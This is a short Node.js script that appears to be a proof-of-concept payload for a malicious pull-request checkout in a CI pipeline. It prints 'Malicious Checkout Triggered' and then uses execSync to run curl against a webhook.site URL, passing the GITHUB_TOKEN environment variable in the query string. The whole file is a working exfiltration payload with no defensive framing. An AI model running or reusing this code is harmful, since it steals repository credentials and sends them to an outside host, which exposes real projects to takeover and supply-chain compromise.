const { execSync } = require('child_process');

console.log("🔥 Malicious Checkout Triggered");

// Send token to your webhook site or server
execSync(`curl http://webhook.site/YOUR-UNIQUE-ID?token=${process.env.GITHUB_TOKEN}`);
